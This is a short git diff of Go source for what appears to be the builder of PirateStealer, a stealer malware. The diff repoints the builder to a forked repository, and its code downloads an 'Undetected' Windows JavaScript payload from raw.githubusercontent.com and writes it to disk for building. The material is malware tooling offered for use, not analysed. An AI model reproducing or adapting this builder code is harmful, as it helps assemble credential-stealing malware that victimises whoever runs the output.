@@ -11,7 +11,7 @@ import (
 	"strings"
 	"time"
 
-	"github.com/bytixo/PirateStealer/Builder/logger"
+	"github.com/Minehacker765/PirateStealer2/Builder/logger"
 )
 
 var (
@@ -170,7 +170,7 @@ func buildPlatform() {
 				}
 			}
 			logger.Info("Building Windows")
-			wincode := getCode("https://raw.githubusercontent.com/bytixo/PirateStealer/main/src/Undetected/index-win.js")
+			wincode := getCode("https://raw.githubusercontent.com/Minehacker765/PirateStealer2/main/src/Undetected/index-win.js")
 			err = ioutil.WriteFile("index-win.js", []byte(wincode), 0666)
 			if err != nil {
 				logger.Fatal("Error writing to file", err)
